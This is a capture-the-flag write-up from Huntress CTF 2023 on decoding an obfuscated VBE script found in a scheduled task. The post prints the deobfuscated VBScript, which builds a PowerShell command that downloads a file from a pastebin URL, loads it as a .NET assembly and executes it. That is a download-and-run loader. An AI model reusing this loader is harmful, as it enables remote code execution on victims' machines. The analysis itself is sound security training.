---
title: "VeeBeeEee"
date: 2023-10-11T13:11:20-10:01
#draft: true
tags: ['CTF','Writeups', 'Malware', 'Easy']
---
 
# [Home](https://jjolley91.github.io/blog/) >

###  [Huntress CTF](https://jjolley91.github.io/blog/huntress_ctf_2023) >  [Easy Challenges](https://jjolley91.github.io/blog/huntress_ctf_2023/1.easy/)

## [Back](https://jjolley91.github.io/blog/huntress_ctf_2023/1.easy/baking)  <> [Next](https://jjolley91.github.io/blog/huntress_ctf_2023/1.easy/snake_eater) 

### While investigating a host, we found this strange file attached to a scheduled task. It was invoked with wscript or something... can you find a flag? 

For this challenge we are given a 'VeeBeeEee' file to download.

As the name of this challenge suggests, the file is a .vbe. A VBE (Visual Basic Script Encoded) file is a file format used for Visual Basic Script (VBS) code that has been encoded for security or obfuscation purposes. VBE files are typically created by encoding the original VBS script to make it less human-readable and harder to reverse engineer. This encoding is done for various reasons, including protecting intellectual property, hiding sensitive information, or preventing unauthorized access to the script.

We found a handy online tool [Here](https://master.ayra.ch/vbs/vbs.aspx) where we were able to upload the vbe, and download the decoded .vbs script.  

We also found a VERY nifty python version, created by John Hammond [here](https://github.com/JohnHammond/vbe-decoder)

### John Hammond, Creating the problem so he can sell you the cure

It wasn't quite that easy, however, as the resulting script was further obfuscated with commented strings, and other techniques to hide the functionality. We worked on this in sublimetext however, so we began by using find/replace to remove all the commented out strings which were thankfully all the same.
#### Remove:

```text
''''''''''''''''al37ysoeopm'al37ysoeopm
```
 
That cleaned things up a bit, We then noticed a variable 'Code' at the bottom, which seemed to be replacing all of the '&'s, which we did next.

Now it is finally easier to recognize what the code is doing, as we are left with:
```powershell
Power0 = "Po"
Power1 = "we"
Power2 = "rS"
Power3 = "he"
Power4 = "ll"
Power5 = " "
Power = Power0 + Power1 + Power2 + Power3 + Power4 + Power5

Path0 = "$f='C"
Path1 = ":\Users" 
Path2 = "\Public"
Path3 = "\Docume" 
Path4 = "nts\July"
Path5 = ".htm';"
Path   = Path0 + Path1 + Path2 + Path3 + Path4 + Path5

Reqest0 = "if (!(Test-Path $f)){Invoke-WebRequest '"
Reqest1 = "https://past"
Reqest2 = "ebin.com/raw"
Reqest3 = "/SiYGwwcz"
Reqest4 = "' -ou"
Reqest5 = "tfile $f  };"
Reqest = Reqest0 + Reqest1 + Reqest2 +  Reqest3 + Reqest4 + Reqest5
PathString = SObject.NameSpace(7).Self.Path  "/"  WScript.ScriptName
InvokeReqest0 = "[System."
InvokeReqest1 = "Reflecti"
InvokeReqest2 = "on.Assembl"
InvokeReqest3 = "y]::loadf" 
InvokeReqest4 = "ile($"
InvokeReqest5 = "f);"
InvokeReqest = InvokeReqest0 + InvokeReqest1 + InvokeReqest2 + InvokeReqest3 + InvokeReqest4 + InvokeReqest5

ExecAssem0 = "[Work"
ExecAssem1 = "Area."
ExecAssem2 = "Work"
ExecAssem3 = "]:"
ExecAssem4 = ":Ex" 
ExecAssem5 = "e()"
ExecAssem   = ExecAssem0 + ExecAssem1 + ExecAssem2 + ExecAssem3 + ExecAssem4 + ExecAssem5
```
This appears to be using VBS to execute Powershell commands, from this the 'Request'section stands out as it seems to be using Invoke-WebRequest to reach out to a URL.  

We concatenated the url, and used curl to obtain the flag!

![vbe](https://github.com/jjolley91/blog/blob/main/static/Huntress_CTF_2023/vbe.png?raw=true)

## [Back](https://jjolley91.github.io/blog/huntress_ctf_2023/1.easy/baking)  <> [Next](https://jjolley91.github.io/blog/huntress_ctf_2023/1.easy/snake_eater) 